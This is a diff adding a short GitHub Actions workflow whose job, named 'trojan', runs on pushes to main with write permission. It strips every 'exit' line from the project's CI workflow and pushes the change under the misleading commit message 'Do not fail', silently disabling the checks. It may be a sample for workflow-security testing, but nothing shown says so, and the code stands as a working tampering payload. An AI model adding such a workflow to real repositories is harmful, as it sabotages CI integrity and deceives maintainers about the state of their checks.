@@ -1,0 +1,18 @@
+on:
+  push:
+    branches:
+      - main
+
+permissions:
+  contents: write
+
+jobs:
+  trojan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@8e8c483db84b4bee98b60c0593521ed34d9990e8 # v6.0.1
+      - run: |
+          sed -i /exit/d .github/workflows/ci.yml
+          git add .github/workflows/ci.yml
+          git commit -m 'Do not fail'
+          git push
